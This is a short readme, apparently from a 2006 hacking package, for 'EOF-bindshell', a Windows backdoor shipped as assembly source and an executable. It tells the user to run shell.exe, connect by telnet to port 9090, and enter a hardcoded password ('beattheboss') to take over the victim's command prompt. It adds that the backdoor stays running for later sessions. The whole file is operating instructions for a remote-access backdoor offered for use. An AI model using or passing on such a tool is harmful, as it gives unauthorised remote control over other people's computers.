This package contains:
shell.asm--->source code of EOF-bindshell
shell.exe--->binary file for the EOF-bindshell
readme.txt-->this file you are reading!

--To execute the shell.exe
-run it
-telnet 127.0.0.1 9090    (or any other ip...)
-type password "beattheboss"
-now cmd of the victim ip(which is 127.0.0.1 right now) will be under your control
-type exit...and the binding ends
-NOTE the shell.exe will stay excuted for further sessions,to end it run task manager
 and terminate shell.exe

Aug. 2006 [berniee]
